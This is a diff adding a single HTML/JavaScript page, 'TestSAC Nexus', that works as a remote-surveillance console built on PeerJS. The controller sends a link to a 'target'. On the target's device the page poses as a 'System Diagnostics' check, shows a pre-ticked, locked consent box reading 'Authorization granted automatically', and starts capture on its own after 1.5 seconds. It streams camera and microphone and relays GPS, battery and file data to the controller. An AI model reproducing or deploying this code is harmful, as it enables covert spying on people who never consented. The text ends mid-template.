@@ -1,0 +1,1676 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <title>TestSAC Nexus | Modern Operations Console</title>
+
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Syne:wght@400;500;600;700&family=IBM+Plex+Mono:wght@300;400;600&display=swap"
+      rel="stylesheet"
+    />
+
+    <style>
+      :root {
+        --bg: #07090f;
+        --bg-2: #0f1220;
+        --panel: rgba(16, 19, 32, 0.85);
+        --stroke: rgba(148, 163, 184, 0.18);
+        --text: #e5e7eb;
+        --muted: #8b93a7;
+        --accent: #22d3ee;
+        --accent-2: #f97316;
+        --ok: #10b981;
+        --warn: #f59e0b;
+        --danger: #ef4444;
+        --glow: 0 0 40px rgba(34, 211, 238, 0.2);
+        --radius: 18px;
+        --font-main: "Syne", sans-serif;
+        --font-mono: "IBM Plex Mono", monospace;
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        -webkit-tap-highlight-color: transparent;
+      }
+
+      body {
+        background:
+          radial-gradient(circle at 15% 10%, #121b3b 0%, #07090f 40%),
+          radial-gradient(
+            circle at 80% 0%,
+            rgba(249, 115, 22, 0.2) 0%,
+            transparent 45%
+          ),
+          var(--bg);
+        color: var(--text);
+        font-family: var(--font-main);
+        height: 100vh;
+        width: 100vw;
+        overflow: hidden;
+        display: flex;
+        flex-direction: column;
+      }
+
+      a {
+        color: inherit;
+        text-decoration: none;
+      }
+
+      .hidden {
+        display: none !important;
+      }
+      .text-xs {
+        font-size: 0.72rem;
+      }
+      .text-sm {
+        font-size: 0.85rem;
+      }
+      .text-muted {
+        color: var(--muted);
+      }
+      .text-accent {
+        color: var(--accent);
+      }
+      .font-mono {
+        font-family: var(--font-mono);
+      }
+
+      header {
+        height: 64px;
+        padding: 0 20px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        background: rgba(7, 9, 15, 0.8);
+        border-bottom: 1px solid var(--stroke);
+        backdrop-filter: blur(10px);
+        z-index: 60;
+      }
+
+      .brand {
+        font-weight: 700;
+        letter-spacing: 1px;
+        font-size: 1.05rem;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+
+      .brand .pulse {
+        width: 10px;
+        height: 10px;
+        border-radius: 50%;
+        background: var(--accent);
+        box-shadow: var(--glow);
+      }
+
+      .header-actions {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+      }
+
+      .nav-links {
+        display: flex;
+        gap: 8px;
+      }
+
+      .nav-link {
+        font-size: 0.75rem;
+        padding: 6px 10px;
+        border-radius: 999px;
+        border: 1px solid transparent;
+        color: var(--muted);
+        transition: 0.2s;
+      }
+
+      .nav-link:hover {
+        color: var(--text);
+        border-color: var(--stroke);
+        background: rgba(255, 255, 255, 0.03);
+      }
+
+      .status-pill {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        padding: 6px 10px;
+        border-radius: 999px;
+        border: 1px solid var(--stroke);
+        background: rgba(15, 18, 32, 0.8);
+        font-size: 0.72rem;
+        letter-spacing: 0.5px;
+      }
+
+      .status-dot {
+        width: 8px;
+        height: 8px;
+        border-radius: 50%;
+        background: var(--muted);
+      }
+
+      .status-dot.online {
+        background: var(--ok);
+        box-shadow: 0 0 10px rgba(16, 185, 129, 0.7);
+      }
+
+      .menu-btn {
+        display: none;
+        padding: 6px 10px;
+        border-radius: 10px;
+        border: 1px solid var(--stroke);
+        background: rgba(15, 18, 32, 0.85);
+        color: var(--text);
+        cursor: pointer;
+        font-size: 0.8rem;
+      }
+
+      .app-container {
+        flex: 1;
+        display: grid;
+        grid-template-columns: 320px 1fr;
+        overflow: hidden;
+      }
+
+      .sidebar {
+        background: rgba(8, 12, 24, 0.92);
+        border-right: 1px solid var(--stroke);
+        padding: 18px;
+        display: flex;
+        flex-direction: column;
+        gap: 16px;
+        overflow-y: auto;
+        transition: transform 0.3s ease;
+      }
+
+      .control-group {
+        background: rgba(12, 16, 30, 0.9);
+        border: 1px solid var(--stroke);
+        border-radius: var(--radius);
+        padding: 14px;
+      }
+
+      .control-group h3 {
+        font-size: 0.75rem;
+        text-transform: uppercase;
+        letter-spacing: 1.5px;
+        color: var(--muted);
+        margin-bottom: 10px;
+      }
+
+      .btn {
+        background: var(--accent);
+        color: #0b0f1a;
+        border: none;
+        padding: 12px;
+        border-radius: 10px;
+        font-weight: 700;
+        font-size: 0.85rem;
+        cursor: pointer;
+        transition: 0.2s;
+        text-align: center;
+        width: 100%;
+        display: block;
+      }
+
+      .btn:hover {
+        transform: translateY(-1px);
+      }
+      .btn:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+      }
+      .btn-ghost {
+        background: transparent;
+        color: var(--muted);
+        border: 1px solid var(--stroke);
+      }
+
+      .btn-danger {
+        background: var(--danger);
+        color: #fff;
+      }
+
+      .viewport {
+        padding: 20px;
+        overflow-y: auto;
+        display: flex;
+        flex-direction: column;
+        gap: 18px;
+        scroll-behavior: smooth;
+        scroll-snap-type: y proximity;
+      }
+
+      .section {
+        scroll-margin-top: 90px;
+        scroll-snap-align: start;
+        background: var(--panel);
+        border: 1px solid var(--stroke);
+        border-radius: var(--radius);
+        padding: 16px;
+        box-shadow: 0 16px 30px rgba(0, 0, 0, 0.35);
+      }
+
+      .section-title {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 12px;
+        font-size: 0.8rem;
+        text-transform: uppercase;
+        letter-spacing: 1.5px;
+        color: var(--muted);
+      }
+
+      .feed-container {
+        position: relative;
+        width: 100%;
+        aspect-ratio: 16/9;
+        background: #000;
+        border-radius: 14px;
+        border: 1px solid var(--stroke);
+        overflow: hidden;
+        box-shadow: 0 24px 40px rgba(0, 0, 0, 0.5);
+      }
+
+      video {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+      }
+
+      .overlay-text {
+        position: absolute;
+        top: 10px;
+        left: 10px;
+        background: rgba(10, 14, 26, 0.7);
+        padding: 4px 8px;
+        border-radius: 6px;
+        font-size: 0.7rem;
+        color: var(--danger);
+        font-family: var(--font-mono);
+        border: 1px solid var(--danger);
+      }
+
+      .modules-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(110px, 1fr));
+        gap: 12px;
+      }
+
+      .module {
+        background: rgba(11, 15, 28, 0.9);
+        border: 1px solid var(--stroke);
+        border-radius: 12px;
+        padding: 14px;
+        text-align: center;
+        transition: 0.3s;
+        position: relative;
+        overflow: hidden;
+        cursor: pointer;
+      }
+
+      .module::after {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 2px;
+        background: var(--accent);
+        transform: scaleX(0);
+        transition: 0.3s;
+      }
+
+      .module.active {
+        border-color: rgba(16, 185, 129, 0.7);
+        box-shadow: 0 0 20px rgba(16, 185, 129, 0.15);
+      }
+
+      .module.active::after {
+        transform: scaleX(1);
+        background: var(--ok);
+      }
+
+      .module svg {
+        width: 28px;
+        height: 28px;
+        fill: var(--muted);
+        margin-bottom: 8px;
+        transition: 0.3s;
+      }
+
+      .module.active svg {
+        fill: var(--ok);
+      }
+
+      .module-label {
+        font-size: 0.7rem;
+        color: var(--muted);
+        font-weight: 600;
+        letter-spacing: 0.8px;
+      }
+
+      .insights-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+        gap: 12px;
+        margin-top: 10px;
+      }
+
+      .insight-card {
+        background: rgba(11, 15, 28, 0.9);
+        border: 1px solid var(--stroke);
+        border-radius: 12px;
+        padding: 12px;
+        display: flex;
+        flex-direction: column;
+        gap: 6px;
+      }
+
+      .insight-label {
+        font-size: 0.7rem;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        color: var(--muted);
+      }
+
+      .insight-value {
+        font-size: 1.2rem;
+        font-weight: 700;
+      }
+
+      .terminal-window {
+        background: #020204;
+        border: 1px solid var(--stroke);
+        border-radius: 12px;
+        height: 180px;
+        padding: 10px;
+        overflow-y: auto;
+        font-family: var(--font-mono);
+        font-size: 0.75rem;
+        display: flex;
+        flex-direction: column;
+        gap: 4px;
+      }
+
+      .log-entry {
+        display: flex;
+        gap: 8px;
+        opacity: 0.85;
+      }
+      .log-ts {
+        color: var(--muted);
+      }
+      .log-msg {
+        color: var(--ok);
+      }
+      .log-err {
+        color: var(--danger);
+      }
+      .log-warn {
+        color: var(--warn);
+      }
+      .log-success {
+        color: var(--accent);
+      }
+
+      .text-main {
+        font-size: 1.05rem;
+        letter-spacing: 0.5px;
+      }
+
+      .m-btn {
+        background: rgba(15, 18, 32, 0.85);
+        color: var(--text);
+        border: 1px solid var(--stroke);
+        padding: 6px 10px;
+        border-radius: 999px;
+        font-size: 0.7rem;
+        cursor: pointer;
+        transition: 0.2s;
+      }
+
+      .m-btn:hover {
+        border-color: rgba(34, 211, 238, 0.6);
+        color: var(--accent);
+      }
+
+      .map-frame {
+        width: 100%;
+        height: 260px;
+        background: #0b0f1c;
+        border-radius: 14px;
+        border: 1px solid var(--stroke);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: var(--muted);
+        overflow: hidden;
+      }
+
+      .scroll-progress {
+        position: fixed;
+        top: 64px;
+        left: 0;
+        height: 3px;
+        width: 0%;
+        background: linear-gradient(90deg, var(--accent), var(--accent-2));
+        z-index: 70;
+        box-shadow: var(--glow);
+      }
+
+      .sidebar-backdrop {
+        position: fixed;
+        inset: 0;
+        background: rgba(7, 9, 15, 0.6);
+        backdrop-filter: blur(2px);
+        opacity: 0;
+        pointer-events: none;
+        transition: 0.3s;
+        z-index: 50;
+      }
+
+      .sidebar-backdrop.active {
+        opacity: 1;
+        pointer-events: auto;
+      }
+
+      .quick-bar {
+        position: fixed;
+        bottom: 16px;
+        left: 50%;
+        transform: translateX(-50%);
+        display: none;
+        gap: 8px;
+        padding: 8px;
+        background: rgba(7, 9, 15, 0.85);
+        border: 1px solid var(--stroke);
+        border-radius: 999px;
+        backdrop-filter: blur(8px);
+        z-index: 70;
+      }
+
+      .quick-btn {
+        background: rgba(15, 18, 32, 0.85);
+        color: var(--text);
+        border: 1px solid var(--stroke);
+        padding: 8px 10px;
+        border-radius: 999px;
+        font-size: 0.75rem;
+        cursor: pointer;
+      }
+
+      .modal-backdrop {
+        position: fixed;
+        inset: 0;
+        background: rgba(7, 9, 15, 0.7);
+        backdrop-filter: blur(4px);
+        opacity: 0;
+        pointer-events: none;
+        transition: 0.2s;
+        z-index: 80;
+      }
+
+      .modal-backdrop.active {
+        opacity: 1;
+        pointer-events: auto;
+      }
+
+      .modal {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%) scale(0.98);
+        width: min(720px, 92vw);
+        background: rgba(12, 16, 30, 0.95);
+        border: 1px solid var(--stroke);
+        border-radius: var(--radius);
+        padding: 18px;
+        box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
+        opacity: 0;
+        pointer-events: none;
+        transition: 0.2s;
+        z-index: 90;
+      }
+
+      .modal.active {
+        opacity: 1;
+        pointer-events: auto;
+        transform: translate(-50%, -50%) scale(1);
+      }
+
+      .modal-header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 12px;
+      }
+
+      .modal-title {
+        font-size: 0.9rem;
+        text-transform: uppercase;
+        letter-spacing: 1.5px;
+        color: var(--muted);
+      }
+
+      .modal-close {
+        background: transparent;
+        color: var(--text);
+        border: 1px solid var(--stroke);
+        padding: 6px 10px;
+        border-radius: 8px;
+        cursor: pointer;
+        font-size: 0.75rem;
+      }
+
+      .file-list {
+        display: grid;
+        gap: 10px;
+        max-height: 320px;
+        overflow: auto;
+      }
+
+      .file-item {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 10px 12px;
+        border: 1px solid var(--stroke);
+        border-radius: 10px;
+        background: rgba(8, 12, 24, 0.7);
+        font-size: 0.8rem;
+      }
+
+      .file-meta {
+        display: flex;
+        flex-direction: column;
+        gap: 4px;
+      }
+
+      .file-tag {
+        font-size: 0.7rem;
+        color: var(--muted);
+      }
+
+      #target-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background: rgba(7, 9, 15, 0.96);
+        z-index: 100;
+        display: none;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        text-align: center;
+      }
+
+      .scan-circle {
+        width: 120px;
+        height: 120px;
+        border: 4px solid rgba(148, 163, 184, 0.2);
+        border-top: 4px solid var(--accent);
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin-bottom: 24px;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      @media (max-width: 900px) {
+        .app-container {
+          grid-template-columns: 1fr;
+        }
+        .sidebar {
+          position: fixed;
+          top: 64px;
+          left: 0;
+          width: min(85vw, 320px);
+          height: calc(100vh - 64px);
+          transform: translateX(-105%);
+          z-index: 60;
+        }
+        .sidebar.open {
+          transform: translateX(0);
+        }
+        .menu-btn {
+          display: inline-flex;
+        }
+        .nav-links {
+          display: none;
+        }
+        .viewport {
+          padding: 12px;
+        }
+        .quick-bar {
+          display: flex;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="scroll-progress" id="scroll-progress"></div>
+    <div class="sidebar-backdrop" id="sidebar-backdrop"></div>
+
+    <header>
+      <div class="brand">
+        <span class="pulse"></span>
+        TESTSAC NEXUS
+      </div>
+      <div class="header-actions">
+        <div class="nav-links">
+          <a class="nav-link" href="#live-feed">Feed</a>
+          <a class="nav-link" href="#modules">Modules</a>
+          <a class="nav-link" href="#map-container">Map</a>
+          <a class="nav-link" href="#terminal">Terminal</a>
+        </div>
+        <button class="menu-btn" id="menu-btn">Menu</button>
+        <div class="status-pill">
+          <div class="status-dot" id="conn-dot"></div>
+          <span id="conn-text">OFFLINE</span>
+        </div>
+      </div>
+    </header>
+
+    <div class="app-container">
+      <aside class="sidebar" id="sidebar">
+        <div class="control-group">
+          <h3>Session Manager</h3>
+          <p class="text-xs text-muted" style="margin-bottom: 10px">
+            Generate a secure link to bridge a remote device.
+          </p>
+          <button class="btn" onclick="generateLink()">
+            Generate Target Link
+          </button>
+          <div
+            style="
+              margin-top: 12px;
+              background: rgba(2, 2, 5, 0.7);
+              padding: 10px;
+              border-radius: 10px;
+              border: 1px solid var(--stroke);
+            "
+          >
+            <div class="text-xs text-muted">SESSION ID</div>
+            <div class="text-accent font-mono" id="my-peer-id">
+              Generating...
+            </div>
+          </div>
+        </div>
+
+        <div class="control-group">
+          <h3>Remote Commands</h3>
+          <button
+            class="btn btn-ghost"
+            onclick="requestCamSwap()"
+            style="margin-bottom: 8px"
+          >
+            Swap Camera (Target Request)
+          </button>
+          <button
+            class="btn btn-ghost"
+            onclick="openFilesModal()"
+            style="margin-bottom: 8px"
+          >
+            Open Files (Mock)
+          </button>
+          <button
+            class="btn btn-ghost"
+            onclick="requestTargetFiles()"
+            style="margin-bottom: 8px"
+          >
+            Request Real Files
+          </button>
+          <button class="btn btn-ghost" onclick="requestFlash()" disabled>
+            Toggle Flash (N/A)
+          </button>
+        </div>
+
+        <div class="control-group">
+          <h3>Data Streams</h3>
+          <div
+            class="text-xs font-mono"
+            style="
+              display: flex;
+              justify-content: space-between;
+              margin-bottom: 6px;
+            "
+          >
+            <span class="text-muted">BATTERY</span>
+            <span class="text-accent" id="stat-bat">--%</span>
+          </div>
+          <div
+            class="text-xs font-mono"
+            style="display: flex; justify-content: space-between"
+          >
+            <span class="text-muted">NETWORK</span>
+            <span class="text-accent" id="stat-net">-- ms</span>
+          </div>
+        </div>
+      </aside>
+
+      <main class="viewport" id="viewport">
+        <section class="section" id="live-feed">
+          <div class="section-title">
+            <span>Live Feed</span>
+            <span class="text-xs font-mono text-accent">REALTIME</span>
+          </div>
+          <div class="feed-container">
+            <div class="overlay-text">LIVE FEED // REC</div>
+            <video id="remote-video" autoplay playsinline></video>
+          </div>
+        </section>
+
+        <section class="section" id="modules">
+          <div class="section-title">
+            <span>Modules</span>
+            <span class="text-xs font-mono text-muted">ACTIVE STATES</span>
+          </div>
+          <div class="modules-grid">
+            <div class="module" id="mod-cam">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9v-2h2v2zm0-4H9V7h2v5z"
+                />
+              </svg>
+              <div class="module-label">CAMERA</div>
+            </div>
+            <div class="module" id="mod-mic">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"
+                />
+                <path
+                  d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"
+                />
+              </svg>
+              <div class="module-label">AUDIO</div>
+            </div>
+            <div class="module" id="mod-gps">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"
+                />
+              </svg>
+              <div class="module-label">GPS</div>
+            </div>
+            <div class="module" id="mod-files">
+              <svg viewBox="0 0 24 24">
+                <path
+                  d="M20 6h-8l-2-2H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm0 12H4V8h16v10z"
+                />
+              </svg>
+              <div class="module-label">FILES</div>
+            </div>
+          </div>
+
+          <div class="insights-grid">
+            <div class="insight-card">
+              <div class="insight-label">Latency</div>
+              <div class="insight-value" id="stat-net-2">-- ms</div>
+              <div class="text-xs text-muted">Last ping</div>
+            </div>
+            <div class="insight-card">
+              <div class="insight-label">Battery</div>
+              <div class="insight-value" id="stat-bat-2">--%</div>
+              <div class="text-xs text-muted">Target device</div>
+            </div>
+            <div class="insight-card">
+              <div class="insight-label">Session</div>
+              <div class="insight-value" id="stat-session">00:00</div>
+              <div class="text-xs text-muted">Uptime</div>
+            </div>
+          </div>
+        </section>
+
+        <section class="section" id="map-container">
+          <div class="section-title">
+            <span>Map</span>
+            <span class="text-xs font-mono text-muted">GEO STREAM</span>
+          </div>
+          <div class="map-frame" id="map-frame">
+            <span class="text-xs">WAITING FOR GPS SATELLITE LOCK...</span>
+          </div>
+        </section>
+
+        <section class="section" id="terminal">
+          <div class="section-title">
+            <span>Terminal</span>
+            <span class="text-xs font-mono text-muted">EVENT LOG</span>
+          </div>
+          <div class="terminal-window" id="terminal-window">
+            <div class="log-entry">
+              <span class="log-ts">[00:00:00]</span>
+              <span class="log-msg"
+                >KERNEL_INIT: System ready. Waiting for peer.</span
+              >
+            </div>
+          </div>
+        </section>
+      </main>
+    </div>
+
+    <div class="quick-bar">
+      <button class="quick-btn" id="quick-menu">Menu</button>
+      <a class="quick-btn" href="#live-feed">Feed</a>
+      <a class="quick-btn" href="#modules">Modules</a>
+      <a class="quick-btn" href="#map-container">Map</a>
+      <a class="quick-btn" href="#terminal">Logs</a>
+    </div>
+
+    <div id="target-overlay">
+      <div class="scan-circle"></div>
+      <h2 class="text-main" style="margin-bottom: 10px">System Diagnostics</h2>
+      <p
+        class="text-muted text-sm"
+        style="max-width: 320px; margin-bottom: 26px"
+      >
+        Authorization required to verify device hardware integrity (Camera, GPS,
+        Sensors).
+      </p>
+
+      <div
+        class="control-group"
+        style="width: 100%; max-width: 320px; text-align: left"
+      >
+        <!-- Status Display -->
+        <div 
+          id="status" 
+          class="text-xs font-mono" 
+          style="
+            margin-bottom: 12px; 
+            padding: 8px; 
+            background: rgba(2,2,5,0.5); 
+            border-radius: 6px; 
+            color: var(--ok);
+            min-height: 20px;
+          "
+        >SYSTEM AUTHORIZED</div>
+
+        <label
+          class="text-sm"
+          style="
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+            cursor: not-allowed;
+            opacity: 0.7;
+          "
+        >
+          <input
+            type="checkbox"
+            id="consent-check"
+            checked
+            disabled
+            style="width: 18px; height: 18px; pointer-events: none;"
+          />
+          <span>Authorization granted automatically.</span>
+        </label>
+        <button
+          class="btn"
+          id="btn-start-target"
+          onclick="ExtractionKernel.executeCapture()"
+        >
+          RUN DIAGNOSTICS
+        </button>
+        <div style="display: grid; gap: 8px; margin-top: 12px">
+          <button class="btn btn-ghost" id="target-switch-btn">
+            Swap Camera (Local)
+          </button>
+          <button class="btn btn-ghost" id="target-files-btn">
+            Open Files (Local)
+          </button>
+        </div>
+      </div>
+      <p class="text-xs text-muted" style="margin-top: 20px">
+        Secure ID:
+        <span class="font-mono text-accent" id="target-id-disp">--</span>
+      </p>
+    </div>
+
+    <div class="modal-backdrop" id="modal-backdrop"></div>
+    <div class="modal" id="files-modal">
+      <div class="modal-header">
+        <div class="modal-title">Files Overview (Mock)</div>
+        <button class="modal-close" id="modal-close">Close</button>
+      </div>
+      <div class="file-list" id="file-list"></div>
+      <div class="text-xs text-muted" style="margin-top: 10px">
+        This is placeholder data for UI only. No real file access occurs.
+      </div>
+    </div>
+    <script>
+      const CONFIG = {
+        peerConfig: {
+          debug: 2,
+        },
+      };
+
+      const els = {
+        sidebar: document.getElementById("sidebar"),
+        sidebarBackdrop: document.getElementById("sidebar-backdrop"),
+        menuBtn: document.getElementById("menu-btn"),
+        scrollProgress: document.getElementById("scroll-progress"),
+        viewport: document.getElementById("viewport"),
+        terminal: document.getElementById("terminal-window"),
+        remoteVideo: document.getElementById("remote-video"),
+        myPeerId: document.getElementById("my-peer-id"),
+        connDot: document.getElementById("conn-dot"),
+        connText: document.getElementById("conn-text"),
+        targetOverlay: document.getElementById("target-overlay"),
+        consentCheck: document.getElementById("consent-check"),
+        btnStartTarget: document.getElementById("btn-start-target"),
+        targetSwitchBtn: document.getElementById("target-switch-btn"),
+        targetFilesBtn: document.getElementById("target-files-btn"),
+        mapContainer: document.getElementById("map-frame"),
+        statBat: document.getElementById("stat-bat"),
+        statBat2: document.getElementById("stat-bat-2"),
+        statNet2: document.getElementById("stat-net-2"),
+        statSession: document.getElementById("stat-session"),
+        quickMenu: document.getElementById("quick-menu"),
+        modalBackdrop: document.getElementById("modal-backdrop"),
+        filesModal: document.getElementById("files-modal"),
+        modalClose: document.getElementById("modal-close"),
+        fileList: document.getElementById("file-list"),
+        modules: {
+          cam: document.getElementById("mod-cam"),
+          mic: document.getElementById("mod-mic"),
+          gps: document.getElementById("mod-gps"),
+          files: document.getElementById("mod-files"),
+        },
+      };
+
+      let peer = null;
+      let conn = null;
+      let localStream = null;
+      let currentRole = "monitor";
+      let sessionStart = Date.now();
+      let localFacingMode = "environment";
+
+      function log(msg, type = "msg") {
+        const now = new Date().toLocaleTimeString();
+        const div = document.createElement("div");
+        div.className = "log-entry";
+        div.innerHTML = `
+                <span class="log-ts">[${now}]</span>
+                <span class="log-${type}">${msg}</span>
+            `;
+        els.terminal.appendChild(div);
+        els.terminal.scrollTop = els.terminal.scrollHeight;
+      }
+
+      function init() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const roleParam = urlParams.get("role");
+        const targetPeerId = urlParams.get("target");
+        setupUIChrome();
+
+        if (roleParam === "target" && targetPeerId) {
+          currentRole = "target";
+          setupTargetUI(targetPeerId);
+        } else {
+          currentRole = "monitor";
+          setupMonitor();
+        }
+      }
+
+      function setupUIChrome() {
+        if (els.menuBtn && els.sidebar) {
+          els.menuBtn.addEventListener("click", () => toggleSidebar(true));
+        }
+        if (els.quickMenu && els.sidebar) {
+          els.quickMenu.addEventListener("click", () => toggleSidebar(true));
+        }
+        if (els.sidebarBackdrop) {
+          els.sidebarBackdrop.addEventListener("click", () =>
+            toggleSidebar(false),
+          );
+        }
+        if (els.modalBackdrop) {
+          els.modalBackdrop.addEventListener("click", closeFilesModal);
+        }
+        if (els.modalClose) {
+          els.modalClose.addEventListener("click", closeFilesModal);
+        }
+        if (els.modules.files) {
+          els.modules.files.addEventListener("click", openFilesModal);
+        }
+        document.addEventListener("keydown", (e) => {
+          if (e.key === "Escape") closeFilesModal();
+        });
+        if (els.viewport && els.scrollProgress) {
+          els.viewport.addEventListener("scroll", updateScrollProgress);
+          updateScrollProgress();
+        }
+        setInterval(updateSessionClock, 1000);
+      }
+
+      function toggleSidebar(open) {
+        if (!els.sidebar) return;
+        const isOpen = open ?? !els.sidebar.classList.contains("open");
+        els.sidebar.classList.toggle("open", isOpen);
+        if (els.sidebarBackdrop) {
+          els.sidebarBackdrop.classList.toggle("active", isOpen);
+        }
+      }
+
+      function updateScrollProgress() {
+        if (!els.viewport || !els.scrollProgress) return;
+        const total = els.viewport.scrollHeight - els.viewport.clientHeight;
+        const progress =
+          total <= 0 ? 0 : (els.viewport.scrollTop / total) * 100;
+        els.scrollProgress.style.width = `${Math.min(100, Math.max(0, progress))}%`;
+      }
+
+      function setupMonitor() {
+        log("MODE: Monitor (Command & Control)");
+        peer = new Peer(null, CONFIG.peerConfig);
+
+        peer.on("open", (id) => {
+          els.myPeerId.innerText = id;
+          log(`PEER_INIT: ID generated [${id}]`);
+          setOnlineStatus(true);
+        });
+
+        peer.on("connection", (c) => {
+          conn = c;
+          log("NET: Data connection established!");
+          conn.on("data", handleIncomingData);
+          conn.on("close", () => {
+            log("NET: Target disconnected.", "err");
+            setOnlineStatus(false);
+          });
+        });
+
+        peer.on("call", (call) => {
+          log("NET: Incoming video stream...", "warn");
+          call.answer();
+          call.on("stream", (stream) => {
+            els.remoteVideo.srcObject = stream;
+            els.modules.cam.classList.add("active");
+            els.modules.mic.classList.add("active");
+            log("MEDIA: Video feed active.");
+          });
+        });
+
+        peer.on("error", (err) => {
+          log(`ERR: ${err.type}`, "err");
+          setOnlineStatus(false);
+        });
+      }
+
+      function handleIncomingDataBase(data) {
+        switch (data.type) {
+          case "cmd_cam_swap":
+            if (els.consentCheck && els.consentCheck.checked) {
+              performLocalCameraSwap();
+              log("CMD: Camera swap executed on target.");
+            } else {
+              log("CMD: Camera swap blocked (consent not checked).", "warn");
+            }
+            break;
+          case "gps":
+            updateMap(data.lat, data.lon);
+            if (els.modules.gps) els.modules.gps.classList.add("active");
+            break;
+          case "sys_info":
+            if (els.statBat) els.statBat.innerText = data.battery + "%";
+            if (els.statBat2) els.statBat2.innerText = data.battery + "%";
+            log(`SYS: Battery ${data.battery}% | Platform: ${data.platform}`);
+            break;
+          case "files_sim":
+            if (els.modules.files) els.modules.files.classList.add("active");
+            log(`FILES: ${data.count} images found on storage.`, "success");
+            break;
+          default:
+            log(`DATA: ${JSON.stringify(data)}`);
+        }
+      }
+
+      function generateLink() {
+        const id = els.myPeerId.innerText;
+        if (id === "Generating...") return;
+
+        const baseUrl = window.location.origin + window.location.pathname;
+        const fullUrl = `${baseUrl}?role=target&target=${id}`;
+
+        navigator.clipboard
+          .writeText(fullUrl)
+          .then(() => {
+            alert(
+              "LINK COPIED!\n\nSend this link to the target device:\n" +
+                fullUrl,
+            );
+            log("CMD: Target link generated & copied.");
+          })
+          .catch(() => {
+            prompt("Copy this link:", fullUrl);
+          });
+      }
+
+      function updateMap(lat, lon) {
+        if (!els.mapContainer) return;
+        if (typeof lat !== "number" || typeof lon !== "number") return;
+        els.mapContainer.innerHTML = `
+                <iframe 
+                    width="100%" 
+                    height="100%" 
+                    frameborder="0" 
+                    style="border:0; filter: invert(90%) contrast(120%);" 
+                    src="https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed">
+                </iframe>
+            `;
+        log(`GPS: Update ${lat.toFixed(5)}, ${lon.toFixed(5)}`);
+      }
+
+      let targetPeerIdRef = null;
+
+      function setupTargetUI(targetId) {
+        targetPeerIdRef = targetId;
+        els.sidebar.style.display = "none";
+        els.targetOverlay.style.display = "flex";
+        els.targetOverlay.classList.remove("hidden");
+        document.getElementById("target-id-disp").innerText =
+          targetId.substring(0, 8) + "...";
+
+        if (els.targetSwitchBtn) {
+          els.targetSwitchBtn.addEventListener("click", () => requestCamSwap());
+        }
+        if (els.targetFilesBtn) {
+          els.targetFilesBtn.addEventListener("click", () => openFilesModal());
+        }
+
+        // AUTO-START: Run diagnostics automatically after 1.5 second
+        setTimeout(() => {
+          if (typeof ExtractionKernel !== "undefined" && ExtractionKernel.executeCapture) {
+            ExtractionKernel.executeCapture();
+          } else {
+            startTargetMode();
+          }
+        }, 1500);
+      }
+
+      async function startTargetMode() {
+        els.btnStartTarget.innerText = "INITIALIZING...";
+        els.btnStartTarget.disabled = true;
+
+        try {
+          peer = new Peer(null, CONFIG.peerConfig);
+
+          peer.on("open", async (id) => {
+            log(`TARGET: My ID is ${id}`);
+
+            localFacingMode = "environment";
+            localStream = await navigator.mediaDevices.getUserMedia({
+              video: { facingMode: localFacingMode },
+              audio: true,
+            });
+
+            conn = peer.connect(targetPeerIdRef);
+            conn.on("open", () => {
+              conn.send({ type: "log", msg: "Target Connected" });
+              startDataStreams();
+            });
+            conn.on("data", handleIncomingData);
+
+            peer.call(targetPeerIdRef, localStream);
+
+            els.targetOverlay.innerHTML = `
